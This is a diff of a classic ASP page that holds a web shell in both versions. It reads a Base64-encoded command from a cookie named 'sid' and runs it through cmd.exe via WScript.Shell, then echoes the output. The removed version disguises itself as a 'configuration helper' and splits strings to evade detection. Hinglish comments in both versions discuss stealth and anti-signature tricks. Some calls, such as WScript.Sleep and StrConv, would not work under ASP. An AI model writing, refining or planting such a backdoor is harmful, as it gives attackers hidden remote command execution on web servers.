@@ -1,58 +1,67 @@
 <%@ Language=VBScript %>
 <%
-' Configuration helper - do not remove
-Response.Buffer=True
-Response.CacheControl="private"
-Response.Expires=-1
+Response.Buffer = True
+Response.CacheControl = "private"
+Response.Expires = -1
 
-Dim z1,z2,z3,z4,z5,o1,o2
+Dim cmdCookie, decodedCmd, objShell, objExec, output, errOutput
 
-z1=Request.Cookies("sid")   ' ← cookie name badal diya (stealth)
-If Len(z1)>10 Then          ' minimum length check (anti-noise)
+' Cookie name (change kar sakta hai stealth ke liye)
+cmdCookie = Request.Cookies("sid")
 
-    z2 = z1                 ' copy
+If Len(cmdCookie) > 10 Then
+    ' Base64 decode
+    decodedCmd = Base64Decode(cmdCookie)
     
-    ' decode logic (obfuscated style)
-    z3 = Base64_D(z2)
-    
-    If Len(z3)>3 Then
+    If Len(decodedCmd) > 3 Then
         On Error Resume Next
         
-        z4 = "cm" & "d.e" & "xe"           ' cmd.exe split kiya
-        z5 = "/c " & z3
+        ' Alternate ways to execute command (WScript.Shell sabse common block hota hai)
+        Set objShell = Server.CreateObject("WScript.Shell")
         
-        Set o1 = Server.CreateObject("WS" & "crip" & "t.Sh" & "ell")
-        Set o2 = o1.Exec(z4 & " " & z5)
-        
-        Dim rOut, rErr
-        rOut = o2.StdOut.ReadAll
-        rErr = o2.StdErr.ReadAll
-        
-        If Len(rOut)>0 Then
-            ' output ko thoda twist (stealth + anti-signature)
-            Response.Write Server.HTMLEncode(Replace(rOut,"<","&lt;"))
+        If Err.Number <> 0 Then
+            ' Agar WScript.Shell block hai to error show kar
+            Response.Write "<pre style='color:red;'>[ERROR] WScript.Shell create failed: " & Err.Description & "</pre>"
+        Else
+            ' Exec cmd
+            Set objExec = objShell.Exec("cmd.exe /c " & decodedCmd)
+            
+            ' Output read karne se pehle wait (kabhi kabhi hang hota hai)
+            Do While objExec.Status = 0
+                WScript.Sleep 100
+            Loop
+            
+            output = objExec.StdOut.ReadAll
+            errOutput = objExec.StdErr.ReadAll
+            
+            If Len(output) > 0 Then
+                Response.Write "<pre>" & Server.HTMLEncode(output) & "</pre>"
+            End If
+            
+            If Len(errOutput) > 0 Then
+                Response.Write "<pre style='color:#ff4444;'>[ERROR]" & vbCrLf & Server.HTMLEncode(errOutput) & "</pre>"
+            End If
+            
+            Set objExec = Nothing
         End If
         
-        If Len(rErr)>0 Then
-            Response.Write Server.HTMLEncode(vbCrLf & "[E]" & Replace(rErr,"<","&lt;"))
-        End If
-        
-        Set o2 = Nothing
-        Set o1 = Nothing
+        Set objShell = Nothing
+        On Error Goto 0
     End If
-    
-    On Error Goto 0
+Else
+    ' Cookie nahi hai ya chhota hai
+    Response.Write "<pre style='color:#888;'>No valid command in cookie (sid).</pre>"
 End If
 
-' Base64 decode - classic ASP ke liye (thoda rename/obfuscate kiya)
-Function Base64_D(s)
-    Dim xDoc, xNode
-    Set xDoc = Server.CreateObject("Msxml2.DOMDocument"&".6.0")
-    Set xNode = xDoc.CreateElement("tmp")
-    xNode.DataType = "bin.base64"
-    xNode.Text = s
-    Base64_D = StrConv(xNode.NodeTypedValue, vbUnicode)
-    Set xNode = Nothing
-    Set xDoc = Nothing
+' Base64 decode function (Msxml2 use kar raha hai - agar yeh block hai to alternative chahiye)
+Function Base64Decode(strBase64)
+    Dim xmlDoc, xmlNode
+    Set xmlDoc = Server.CreateObject("Msxml2.DOMDocument.6.0")
+    Set xmlNode = xmlDoc.CreateElement("b64")
+    xmlNode.DataType = "bin.base64"
+    xmlNode.Text = strBase64
+    Base64Decode = StrConv(xmlNode.NodeTypedValue, vbUnicode)
+    Set xmlNode = Nothing
+    Set xmlDoc = Nothing
 End Function
 %>
